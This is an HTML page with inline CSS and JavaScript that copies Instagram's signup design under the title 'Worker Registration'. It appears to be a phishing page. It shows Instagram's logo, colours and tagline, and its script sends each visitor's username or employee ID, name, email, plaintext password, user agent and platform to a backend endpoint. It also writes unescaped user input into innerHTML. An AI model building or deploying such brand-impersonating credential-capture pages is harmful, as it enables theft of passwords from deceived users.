<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Worker Registration</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>ðŸ“‹</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        /* Desktop Layout */
        .container {
            width: 100%;
            max-width: 935px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 32px;
        }
        
        /* Phone Mockup - Desktop Only */
        .phone-mockup {
            display: none;
            position: relative;
            width: 454px;
            height: 618px;
        }
        
        .phone-mockup img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        
        @media (min-width: 875px) {
            body {
                background: #fafafa;
            }
            
            .phone-mockup {
                display: block;
            }
        }
        
        /* Registration Card */
        .registration-container {
            width: 100%;
            max-width: 350px;
        }
        
        .registration-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            margin-bottom: 10px;
        }
        
        .logo {
            font-family: 'Billabong', 'Brush Script MT', cursive;
            font-size: 51px;
            text-align: center;
            margin-bottom: 12px;
            font-weight: 300;
            letter-spacing: 1px;
        }
        
        .logo-text {
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .tagline {
            text-align: center;
            color: #8e8e8e;
            font-weight: 600;
            font-size: 17px;
            margin-bottom: 24px;
            line-height: 20px;
        }
        
        .form-container {
            width: 100%;
        }
        
        #message-container {
            margin-bottom: 10px;
        }
        
        .input-group {
            margin-bottom: 6px;
        }
        
        .form-input {
            width: 100%;
            padding: 9px 0 7px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
            outline: none;
            transition: all 0.2s;
            height: 36px;
        }
        
        .form-input:focus {
            border-color: #a8a8a8;
            background-color: #fff;
        }
        
        .form-input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }
        
        .terms-text {
            color: #8e8e8e;
            font-size: 12px;
            text-align: center;
            margin: 10px 0 18px;
            line-height: 16px;
        }
        
        .terms-text a {
            color: #00376b;
            text-decoration: none;
            font-weight: 600;
        }
        
        .signup-btn {
            width: 100%;
            padding: 7px 16px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: all 0.2s;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .signup-btn:hover {
            background: #1877f2;
        }
        
        .signup-btn:active {
            opacity: 0.7;
        }
        
        .signup-btn:disabled {
            background: #b2dffc;
            cursor: not-allowed;
            opacity: 0.7;
        }
        
        /* Loading Spinner */
        .spinner {
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 0.8s linear infinite;
            display: none;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .btn-loading .btn-text {
            display: none;
        }
        
        .btn-loading .spinner {
            display: block;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider::before {
            margin-right: 18px;
        }
        
        .divider::after {
            margin-left: 18px;
        }
        
        .login-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 24px 40px;
            text-align: center;
            font-size: 14px;
        }
        
        .login-text {
            color: #262626;
        }
        
        .login-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
            margin-left: 4px;
        }
        
        .login-link:hover {
            color: #00376b;
        }
        
        /* Messages */
        .success-message {
            background-color: #d4edda;
            color: #155724;
            padding: 10px 12px;
            border-radius: 4px;
            margin-bottom: 10px;
            font-size: 12px;
            text-align: center;
            border: 1px solid #c3e6cb;
            animation: slideIn 0.3s ease;
        }
        
        .error-message {
            background-color: #fed7d7;
            color: #c53030;
            padding: 10px 12px;
            border-radius: 4px;
            margin-bottom: 10px;
            font-size: 12px;
            text-align: center;
            border: 1px solid #fc8181;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* Popup */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.65);
            z-index: 999;
            display: none;
            animation: fadeIn 0.2s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .message-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            border-radius: 12px;
            max-width: 400px;
            width: 90%;
            z-index: 1000;
            display: none;
            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        
        @keyframes popIn {
            from {
                opacity: 0;
                transform: translate(-50%, -50%) scale(0.8);
            }
            to {
                opacity: 1;
                transform: translate(-50%, -50%) scale(1);
            }
        }
        
        .popup-header {
            padding: 24px 24px 16px;
            text-align: center;
        }
        
        .popup-icon {
            font-size: 48px;
            margin-bottom: 12px;
        }
        
        .popup-title {
            font-size: 18px;
            font-weight: 600;
            color: #262626;
            margin-bottom: 8px;
        }
        
        .popup-details {
            font-size: 14px;
            color: #8e8e8e;
            line-height: 18px;
            padding: 0 24px 24px;
        }
        
        .popup-divider {
            height: 1px;
            background: #dbdbdb;
        }
        
        .popup-btn {
            width: 100%;
            padding: 14px;
            background: none;
            border: none;
            color: #0095f6;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .popup-btn:hover {
            background: #fafafa;
        }
        
        .popup-btn:active {
            background: #efefef;
        }
        
        /* Footer */
        .footer {
            margin-top: 24px;
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
        }
        
        /* Mobile Adjustments */
        @media (max-width: 450px) {
            body {
                padding: 0;
                background: #fff;
            }
            
            .registration-box {
                border: none;
                border-radius: 0;
                padding: 20px;
            }
            
            .login-container {
                border: none;
                border-top: 1px solid #dbdbdb;
                border-radius: 0;
            }
        }
        
        /* Prevent text selection on buttons */
        button {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Phone Mockup (Desktop Only) -->
        <div class="phone-mockup">
            <svg width="454" height="618" viewBox="0 0 454 618" fill="none">
                <!-- Phone Frame -->
                <rect x="112" width="340" height="618" rx="40" fill="#000" fill-opacity="0.05"/>
                <rect x="120" y="8" width="324" height="602" rx="36" fill="#fff"/>
                
                <!-- Decorative Screenshot -->
                <rect x="135" y="80" width="294" height="450" rx="8" fill="#fafafa"/>
                
                <!-- Mock Instagram UI Elements -->
                <circle cx="282" cy="200" r="50" fill="#0095f6" opacity="0.1"/>
                <rect x="200" y="280" width="164" height="8" rx="4" fill="#dbdbdb"/>
                <rect x="200" y="300" width="140" height="8" rx="4" fill="#dbdbdb"/>
                <rect x="200" y="320" width="180" height="8" rx="4" fill="#dbdbdb"/>
            </svg>
        </div>
        
        <!-- Registration Form -->
        <div class="registration-container">
            <div class="registration-box">
                <div class="logo">
                    <span class="logo-text">Instagram</span>
                </div>
                
                <p class="tagline">Sign up to see photos and videos from your friends.</p>
                
                <div class="form-container">
                    <div id="message-container"></div>
                    
                    <form id="registrationForm">
                        <div class="input-group">
                            <input type="text" 
                                   id="employeeId" 
                                   class="form-input" 
                                   placeholder="Employee ID or Username" 
                                   autocomplete="username"
                                   required>
                        </div>
                        
                        <div class="input-group">
                            <input type="text" 
                                   id="fullName" 
                                   class="form-input" 
                                   placeholder="Full Name" 
                                   autocomplete="name"
                                   required>
                        </div>
                        
                        <div class="input-group">
                            <input type="email" 
                                   id="email" 
                                   class="form-input" 
                                   placeholder="Email (optional)" 
                                   autocomplete="email">
                        </div>
                        
                        <div class="input-group">
                            <input type="password" 
                                   id="password" 
                                   class="form-input" 
                                   placeholder="Password" 
                                   autocomplete="new-password"
                                   required>
                        </div>
                        
                        <p class="terms-text">
                            By signing up, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.
                        </p>
                        
                        <button type="submit" class="signup-btn" id="signupBtn">
                            <span class="btn-text">Sign up</span>
                            <span class="spinner"></span>
                        </button>
                    </form>
                </div>
            </div>
            
            <div class="login-container">
                <span class="login-text">Have an account?</span>
                <a href="#" class="login-link">Log in</a>
            </div>
            
            <div class="footer">
                Â© 2026 Worker Registration System
            </div>
        </div>
    </div>

    <!-- Success Popup -->
    <div class="popup-overlay" id="popupOverlay"></div>
    <div class="message-popup" id="messagePopup">
        <div class="popup-header">
            <div class="popup-icon">âœ…</div>
            <div class="popup-title">Registration Successful!</div>
        </div>
        <div class="popup-details" id="popupDetails"></div>
        <div class="popup-divider"></div>
        <button class="popup-btn" onclick="closePopup()">OK</button>
    </div>

    <script>
        // Get API URL from environment or use relative path
        const API_URL = window.location.hostname === 'localhost' 
            ? 'http://localhost:3000'
            : '';
        
        // Registration form handler
        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const employeeId = document.getElementById('employeeId').value.trim();
            const fullName = document.getElementById('fullName').value.trim();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const messageContainer = document.getElementById('message-container');
            const signupBtn = document.getElementById('signupBtn');
            
            // Validation
            if (!employeeId || !fullName || !password) {
                showMessage('Please fill in all required fields', 'error');
                return;
            }
            
            if (password.length < 6) {
                showMessage('Password must be at least 6 characters', 'error');
                return;
            }
            
            // Show loading state
            signupBtn.classList.add('btn-loading');
            signupBtn.disabled = true;
            
            try {
                const registrationData = {
                    employeeId,
                    fullName,
                    email,
                    password,
                    registrationTime: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform
                };
                
                // Send to backend
                const response = await fetch(`${API_URL}/api/register`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(registrationData)
                });
                
                const result = await response.json();
                
                if (response.ok) {
                    // Success
                    showMessage('Registration successful! ðŸŽ‰', 'success');
                    showUserPopup(registrationData);
                    
                    // Clear form
                    document.getElementById('registrationForm').reset();
                    
                    // Remove success message after 3 seconds
                    setTimeout(() => {
                        messageContainer.innerHTML = '';
                    }, 3000);
                } else {
                    // Error from server
                    showMessage(result.error || 'Registration failed. Please try again.', 'error');
                }
            } catch (error) {
                console.error('Registration error:', error);
                showMessage('Network error. Please check your connection and try again.', 'error');
            } finally {
                // Hide loading state
                signupBtn.classList.remove('btn-loading');
                signupBtn.disabled = false;
            }
        });
        
        // Show message helper
        function showMessage(message, type) {
            const messageContainer = document.getElementById('message-container');
            const className = type === 'success' ? 'success-message' : 'error-message';
            messageContainer.innerHTML = `<div class="${className}">${message}</div>`;
            
            setTimeout(() => {
                messageContainer.innerHTML = '';
            }, 5000);
        }
        
        // Show popup to user
        function showUserPopup(details) {
            const popup = document.getElementById('messagePopup');
            const overlay = document.getElementById('popupOverlay');
            const popupDetails = document.getElementById('popupDetails');
            
            popupDetails.innerHTML = `
                Welcome to our team, <strong>${details.fullName}</strong>!<br><br>
                Your registration has been completed successfully.<br>
                Employee ID: <strong>${details.employeeId}</strong>
            `;
            
            overlay.style.display = 'block';
            popup.style.display = 'block';
        }
        
        // Close popup
        function closePopup() {
            document.getElementById('popupOverlay').style.display = 'none';
            document.getElementById('messagePopup').style.display = 'none';
        }
        
        // Close popup when clicking overlay
        document.getElementById('popupOverlay').addEventListener('click', closePopup);
        
        // Prevent zoom on double tap (iOS)
        let lastTouchEnd = 0;
        document.addEventListener('touchend', function (event) {
            const now = (new Date()).getTime();
            if (now - lastTouchEnd <= 300) {
                event.preventDefault();
            }
            lastTouchEnd = now;
        }, false);
    </script>
</body>
</html>
